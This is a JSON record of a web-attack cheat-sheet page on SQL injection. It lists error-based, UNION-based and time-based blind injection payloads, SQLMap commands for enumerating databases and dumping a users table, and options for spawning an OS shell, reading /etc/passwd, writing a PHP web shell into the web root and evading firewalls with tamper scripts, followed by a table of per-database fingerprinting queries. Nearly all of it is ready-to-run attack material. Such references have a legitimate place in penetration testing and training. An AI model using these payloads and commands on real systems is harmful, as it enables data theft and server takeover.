{"title": "sqli", "source": "cheatsheet", "source_label": "Cheat Sheets", "path": "cheatsheet/ref-web-attacks-sqli", "html": "<h1 id=\"web-attacks-sqli\">sqli</h1>\n<p>&gt; Test any user input that queries a database. Use manual testing first, then SQLMap for automation.</p>\n<h3>Manual Testing</h3>\n<pre><code class=\"language-bash\"># Error-based detection\n&#x27; OR 1=1-- -\n&quot; OR 1=1-- -\n&#x27; UNION SELECT NULL-- -\n&#x27; AND 1=CONVERT(int,(SELECT @@version))-- -\n\n# UNION-based (find column count first)\n&#x27; ORDER BY 1-- -   (increment until error)\n&#x27; UNION SELECT 1,2,3-- -\n&#x27; UNION SELECT 1,@@version,3-- -\n&#x27; UNION SELECT 1,table_name,3 FROM information_schema.tables-- -\n\n# Time-based blind\n&#x27; AND SLEEP(5)-- -                    (MySQL)\n&#x27;; WAITFOR DELAY &#x27;0:0:5&#x27;-- -          (MSSQL)\n&#x27; AND pg_sleep(5)-- -                 (PostgreSQL)</code></pre>\n<h3>SQLMap</h3>\n<pre><code class=\"language-bash\"># Basic (GET parameter)\nsqlmap -u &quot;http://target/page?id=1&quot; --batch\n\n# From request file (Burp)\nsqlmap -r request.txt --batch\n\n# POST data\nsqlmap -u &quot;http://target/login&quot; --data &quot;user=admin&amp;pass=test&quot; --batch\n\n# Enumerate\nsqlmap -r req.txt --batch --dbs\nsqlmap -r req.txt --batch -D dbname --tables\nsqlmap -r req.txt --batch -D dbname -T users --dump\n\n# OS shell (if stacked queries + write perms)\nsqlmap -r req.txt --batch --os-shell\n\n# File read/write\nsqlmap -r req.txt --file-read &quot;/etc/passwd&quot;\nsqlmap -r req.txt --file-write shell.php --file-dest /var/www/html/shell.php\n\n# WAF bypass\nsqlmap -r req.txt --tamper=space2comment --random-agent --level 5 --risk 3</code></pre>\n<h3>Database-Specific</h3>\n<p>| DB | Version | Current User | Databases | |----|---------|-------------|-----------| | MySQL | <code>@@version</code> | <code>current_user()</code> | <code>information_schema.schemata</code> | | MSSQL | <code>@@version</code> | <code>SYSTEM_USER</code> | <code>master..sysdatabases</code> | | PostgreSQL | <code>version()</code> | <code>current_user</code> | <code>pg_database</code> | | Oracle | <code>v$version</code> | <code>SYS_CONTEXT(&#x27;USERENV&#x27;,&#x27;SESSION_USER&#x27;)</code> | <code>all_tables</code> | | SQLite | <code>sqlite_version()</code> | N/A | <code>sqlite_master</code> |</p>", "excerpt": "sqli &gt; Test any user input that queries a database. Use manual testing first, then SQLMap for automation. Manual Testing # Error-based detection &#x27; OR 1=1-- - &quot; OR 1=1-- - &#x27; UNION SEL…", "tags": ["reference", "web-attacks"]}